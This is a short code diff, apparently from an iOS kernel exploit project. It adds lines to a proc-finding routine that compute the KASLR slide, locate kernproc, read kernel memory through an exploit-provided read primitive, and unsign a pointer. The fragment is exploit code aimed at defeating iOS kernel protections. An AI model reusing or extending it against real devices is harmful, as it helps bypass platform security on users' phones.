@@ -242,6 +242,11 @@ void kread_IOSurface_find_proc(struct kfd* kfd)
             }
         }
     }
+    u64 kernel_slide = kernel_base - 0xFFFFFFF007004000;
+    u64 kernproc = patchfind_kernproc(kfd, kernel_base);
+    u64 proc_kaddr = 0;
+    kread((u64)kfd, kernproc, &proc_kaddr, sizeof(proc_kaddr));
+    proc_kaddr = unsign_kaddr(proc_kaddr);
     
     while (proc_kaddr != 0) {
         i32 pid = dynamic_kget(proc, p_pid, proc_kaddr);
